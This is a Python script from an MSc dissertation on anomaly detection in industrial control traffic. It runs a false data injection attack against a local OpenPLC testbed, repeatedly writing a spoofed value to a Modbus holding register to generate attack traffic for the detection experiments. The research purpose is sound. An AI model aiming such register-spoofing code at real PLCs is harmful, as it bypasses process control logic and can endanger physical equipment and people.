"""
false_data_injection.py

MSc Cybersecurity Dissertation
Evaluating Machine Learning Approaches for Anomaly Detection in OT Network Traffic
Dewanshi Manoj Agarkar

------------------------------------------------------------------------------
PURPOSE
------------------------------------------------------------------------------
False data injection attack against the OpenPLC testbed. Writes a fixed,
implausible value (SPOOFED_VALUE) directly to a Holding Register
(TARGET_REGISTER), bypassing the tank fill/drain process's own control
logic entirely. See Section 6.3.1 for the full rationale behind the
chosen register, value, and timing.

------------------------------------------------------------------------------
USAGE
------------------------------------------------------------------------------
Run against the running OpenPLC testbed, with tshark capturing on the
loopback interface on port 502:

    python3 attacks/false_data_injection.py

------------------------------------------------------------------------------
OUTPUT
------------------------------------------------------------------------------
    false_data_injection_log.csv -- this script's own internal log
    (timestamp, register, spoofed value, latency, success). The traffic
    captured separately by tshark (attack1_writes.csv) is what the
    detection scripts actually evaluate against.
------------------------------------------------------------------------------
"""

from pymodbus.client import ModbusTcpClient
import time
import csv
from datetime import datetime

# --- Config ---
PLC_IP = "127.0.0.1"
PLC_PORT = 502
TARGET_REGISTER = 0
SPOOFED_VALUE = 900
NUM_INJECTIONS = 10
INTERVAL_SECONDS = 5
LOG_FILE = "false_data_injection_log.csv"

def main():
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT)

    with open(LOG_FILE, mode="w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "register", "spoofed_value", "latency_ms", "success"])

        connected = client.connect()
        if not connected:
            print(f"failed to connect to {PLC_IP}:{PLC_PORT}")
            return

        print(f"connected. Starting false data injection on register {TARGET_REGISTER}...")

        for i in range(NUM_INJECTIONS):
            start = time.perf_counter()
            timestamp = datetime.now().isoformat()

            success = False
            try:
                result = client.write_register(TARGET_REGISTER, SPOOFED_VALUE)
                success = not result.isError()
            except Exception as e:
                print(f"Write {i+1} failed: {e}")

            latency_ms = round((time.perf_counter() - start) * 1000, 3)

            print(f"[{timestamp}] Injection {i+1}/{NUM_INJECTIONS} "
                  f"-> reg {TARGET_REGISTER} = {SPOOFED_VALUE} "
                  f"| latency: {latency_ms}ms | success: {success}")

            writer.writerow([timestamp, TARGET_REGISTER, SPOOFED_VALUE, latency_ms, success])
            f.flush()

            time.sleep(INTERVAL_SECONDS)

        client.close()
        print(f"\nDone. Log saved to {LOG_FILE}")

if __name__ == "__main__":
    main()
